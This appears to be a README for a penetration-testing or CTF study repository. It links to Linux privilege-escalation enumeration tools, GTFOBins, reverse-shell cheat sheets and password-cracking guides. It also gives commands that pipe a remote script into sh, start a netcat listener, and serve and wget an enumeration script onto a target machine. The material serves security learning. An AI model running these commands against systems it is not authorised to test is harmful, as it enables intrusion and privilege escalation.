# Ressources

## Local Linux Enumeration

> this section contains tools that are used to find potential attack vectors on a computer.

##### linPEAS :

    https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
> download with ```curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh```

##### LinEnum :

    https://github.com/rebootuser/LinEnum
> you can also find it [here](/ressources/)

## GTFOBins

BTFOBins is a website you can refer to if you find binaries that can be used to bypass local security restrictions in misconfigured systems.

> just seach the name of the binary in the search bar

    https://gtfobins.github.io/

## Cheat sheets

### Reverse shell :

   ##### PentestMonkey

    https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet


   ##### PayloadAllTheThings

    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

   ##### ironHackers

    https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/


### Nmap :

    https://www.stationx.net/nmap-cheat-sheet/


### GoBuster :

    https://3os.org/penetration-testing/cheatsheets/gobuster-cheatsheet/
    
    
### John The Ripper :

    https://www.golinuxcloud.com/john-the-ripper-password-cracker/
    
    https://cheatsheet.haax.fr/passcracking-hashfiles/john_cheatsheet/
    
    
## Misc

### How do I start a netcat listener ?

```nc -lnvp PORT```

where :
    ```l``` is for "listen mode", ```n```is to not resolve DNS, ```v```is for verbose mode (more text printed), ```p``` to specify the port and ```PORT``` is the port you want to use
    
    
 ### How do I send LinEnum to the target machine ?
  
 - Download the executable from this repo, go the the directory where it's located and type ```python3 -m http.server 1234```
 - Open a terminal on your computer and type ```ifconfig```, find your ip adress.
 - On your target machine, type ```wget http://**YourIP**:1234/LinEnum.sh```

that's it ! you should have LinEnum on the target machine ;)
          
